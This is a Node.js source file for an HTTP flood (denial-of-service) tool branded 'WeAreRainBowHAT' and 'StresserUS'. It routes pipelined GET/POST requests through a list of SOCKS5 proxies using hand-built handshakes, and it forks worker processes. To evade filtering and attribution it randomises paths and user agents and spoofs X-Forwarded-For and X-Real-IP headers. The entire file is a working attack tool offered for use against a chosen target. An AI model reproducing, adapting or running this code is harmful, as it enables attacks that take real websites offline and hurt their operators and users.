require('events').EventEmitter.defaultMaxListeners = 0;

var net = require('net');
const fs = require('fs');
const url = require('url');
const path = require('path');
const cluster = require('cluster');

if (process.argv.length < 8){
    console.log(`
    Socks5 (Socket HTTP Version) | <3 WeAreRainBowHAT
        Usage : node ${path.basename(__filename)} <GET/POST/HEAD> <host> <socks5.txt> <durations> <rate> <threads/20> (postdata="" headerdata="")
    `);
    process.exit(0);
}

let Athings = {
    "method":process.argv[2],
    "url":String(process.argv[3]).split('""')[0],
    "threads":process.argv[7],
    "rate":process.argv[6],
    "proxiesFile":process.argv[4],
    "duration":process.argv[5],
}

process.on('uncaughtException', function (e) { 
    //console.log(e)
});
process.on('unhandledRejection', function (e) { 
    //console.log(e)
});

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

let parsetarget = url.parse(Athings.url)

const proxiesUas = new Map()

const ConnectSocks5 = (DataIN,callbacks) => {
    var proxy = {
        host: String(DataIN["proxyip"]), // You can create a socks5 server by running `ssh -D 8001 xyz.com`
        port: Number(DataIN["proxyport"]),
        destinationHost: String(DataIN["hostname"]),
        destinationPort: Number(DataIN["destport"]),
      };
      
      var socks5Handshake = Buffer.alloc(3);
      socks5Handshake[0] = 0x05; // SOCKS version number (must be 0x05 for this version)
      socks5Handshake[1] = 0x01; // Number of authentication methods supported.
      socks5Handshake[2] = 0x00; // 0x00: No authentication
      
      var serverHandshakeResponse = "0500"; // SOCKS version number followed by chosen authentication method, 1 byte, or 0xFF if no acceptable methods were offered.
      var serverConnectionResponse = "05000001000000000000";
      
      var socket = new net.connect({
        host: proxy.host,
        port: proxy.port
      }, function() {
        //socket.setEncoding('utf-8');
        socket.setNoDelay(true)
        socket.setKeepAlive(true,10000)
        socket.setTimeout(10000);
        // Socket connect done. Initiating Socks5 handshake
        socket.write(socks5Handshake);
      
        // Error event handler to handle error in case of ECONNRESET, ECONNREFUSED etc.
        socket.on('error', function(err){
            socket.end();
            socket.destroy();
            delete Socket
            return callbacks(undefined,err)
        });

        socket.on('timeout', function(){
            socket.end();
            socket.destroy();
            delete Socket
            return callbacks(undefined,"Timeout")
        });
      
        socket.once('data', function(data) {
          if(data.toString('hex') == serverHandshakeResponse) {
            var addressLength = Buffer.byteLength(proxy.destinationHost);
            var requestBuffer = Buffer.alloc(7 + addressLength);
            var portOffset;
      
            requestBuffer[0] = 0x05; // SOCKS version number (must be 0x05 for this version)
            requestBuffer[1] = 0x01; // establish a TCP/IP stream connection
            requestBuffer[2] = 0x00; // reserved, must be 0x00
            requestBuffer[3] = 0x03; // address type, 1 byte. 0x03 = Domain name
            requestBuffer[4] = addressLength; // 1 byte of name length followed by the name for domain name
            requestBuffer.write(proxy.destinationHost, 5, addressLength);
            portOffset = 5 + addressLength;
      
            requestBuffer.writeUInt16BE(proxy.destinationPort, portOffset, true);
            socket.write(requestBuffer);
      
            socket.once('data', function(data){
      
              if(data.toString('hex') == serverConnectionResponse) {
      
                //   console.log("Socks5 Connected");
                  return callbacks(socket,undefined);
      
              }
              else {
                  
                  //console.log("Socks5 connection request failed. Closing the socket");
                  socket.end();
                  return callbacks(undefined,"Connection Failed")
              }
            });
          }
          else {
              //console.log("Socks5 handshake failed. Closing the socket");
              socket.end();
              return callbacks(undefined,"handshake Failed")
          }
        });
      });
}

let POSTDATA = 0,
    headerbuilders = 0,
    headerbuildersdata = { "data":0, "inside":[] }

async function srt(){

    const proxies = await fs.readFileSync(Athings["proxiesFile"],"utf-8").toString().replace(/\r/g, '').split('\n').filter(Boolean).filter(word => word.trim().length > 0);
    
    const UAs = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
        "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
        "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
        "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
        "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    ];

    for (const Proxy of proxies) {
        proxiesUas.set(Proxy,UAs[Math.floor(Math.random() * UAs.length)])
    }

    for (const ss of process.argv) {
        if (ss !== Athings["url"] && ss !== Athings["threads"] && ss !== Athings["rate"] && ss !== Athings["proxiesFile"] && ss !== Athings["method"] && ss !== Athings["duration"]) {
            if (ss.includes("postdata=")){
                if (methods.toUpperCase() != "POST"){
                    console.error("Method Invalid (Has Postdata But Not POST Method)")
                    process.exit(1);
                }
                POSTDATA = ss.slice(9);
            } else if (ss.includes("headerdata=")){
                const hddata = ss.slice(11).split('""')[0].split("&");
                for (let i = 0; i < hddata.length; i++) {
                    const head = hddata[i].split("=")[0];
                    const dat = hddata[i].split("=")[1];
                    headerbuildersdata["data"] = true;
                    headerbuildersdata["inside"][i] = `${head}:${dat}`
                }
            }
        }
    }

    console.log("Started Attacking")

    setInterval(() => {
        attack(proxies[Math.floor((Math.random() * proxies.length))].split(":"))
    })
}

const RandomString = (length) => {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const escapeRegExp = (string) => {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
  
const replaceAll = (str, find, replace) => {
    return str.replace(new RegExp(escapeRegExp(find), 'g'), replace);
}

const getRandomNumberBetween = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1) + min);
}

const ip_spoofing = () =>{
    return getRandomNumberBetween(1, 255) + "." + getRandomNumberBetween(1, 255) + "." + getRandomNumberBetween(1, 255) + "." + getRandomNumberBetween(1, 255)
}

function buildHeader(thisproxy) {
    let something = {

    }
    let sometin = ""
    if (headerbuildersdata["data"]) {
        headerbuildersdata.inside.forEach(dt => {
            const va = dt.split(":");
            const sdtring = String(va[0]);
            const sdtringval = String(va[1]);
            something[sdtring] = sdtringval;
            if (!["referer","origin","user-agent","cache-control","x-forwarded-for","x-real-ip","x-remote-ip","content-length","connection"].includes(sdtring)) {
                sometin += `\r\n${sdtring}: ${sdtringval}`
            }
        })
    }
    let head = `${Athings["method"]} ${String((parsetarget["path"].includes("%RAND%") ? replaceAll(parsetarget["path"],"%RAND%",RandomString(4)) : parsetarget["path"]))} HTTP/1.1\r\nHost: ${parsetarget["host"]}`
    head += `\r\nreferer: ${(something["referer"] ? `${something["referer"]}` : parsetarget["href"])}`
    head += `\r\norigin: ${ (something["origin"] ? something["origin"] : `${parsetarget["protocol"]}//${parsetarget["host"]}`)}`
    head += `\r\nuser-agent: ${( something["user-agent"] ? `${something["user-agent"]}` : proxiesUas.get(thisproxy.join(":")) )}`
    head += `\r\ncache-control: ${(something["cache-control"] ? `${something["cache-control"]}` : "max-age=0")}`
    head += `\r\nx-forwarded-for: ${( something["x-forwarded-for"] ? `${something["x-forwarded-for"]}` : `${ip_spoofing()}` )}`
    head += `\r\nx-real-ip: ${( something["x-real-ip"] ? `${something["x-real-ip"]}` : `${thisproxy[0]}` )}`
    head += `\r\nx-remote-ip: ${( something["x-remote-ip"] ? `${something["x-remote-ip"]}` : `${thisproxy[0]}` )}`
    head += `\r\ncontent-length: ${( something["content-length"] ? something["content-length"] : `0`)}`
    head += sometin
    head += `${(Athings["method"].includes("POST") && POSTDATA) ? "content-type: text/plain" : ""}`
    head += `\r\nconnection: ${(something["connection"] ? `${something["connection"]}` : `Keep-Alive`)}`
    head += `${((Athings["method"].includes("POST") && POSTDATA)) ? `\r\n\r\n${replaceAll(POSTDATA,"%RAND%",RandomString(getRandomNumberBetween(4,12)))}` : ""}`
    head += '\r\n\r\n'
    head = replaceAll(head,"%RAND%",RandomString(getRandomNumberBetween(4,12)))
    return String(head)
}

function attack(Proxysplit){

    const thething = ConnectSocks5({
        proxyip:String(Proxysplit[0]),
        proxyport:parseInt(Proxysplit[1]),
        hostname:String(parsetarget["host"]),
        destport:((parsetarget["port"] ? Number(parsetarget["port"]) : 80))
    }, (Socket,err) => {
        if (!err) {
            Socket.setEncoding('utf-8');
            Socket.setTimeout(10000)
            for (let i = 0; i < Athings["rate"]; i++){
                Socket.setEncoding('utf-8');
                const headered = buildHeader(Proxysplit);
                Socket.setKeepAlive(true,10000)
                Socket.write(headered)
            }
            Socket.on("data", () => {
                setTimeout(() => {
                    Socket.end();
                    Socket.destroy();
                    delete Socket
                    return delete thething;
                },8000);
            })
        }
    })
}

if (cluster.isMaster){
    for (let i = 0; i < Athings["threads"]; i++){
        cluster.fork();
    }
    console.log("(!) Now Attacked | Method <3 WeAreRainBowHAT & <3 StresserUS");
    setTimeout(() => {
        console.log("(!) Attacking Done")
        process.exit(0);
    },Math.floor(Athings["duration"]*1000));
} else {
    srt()
}
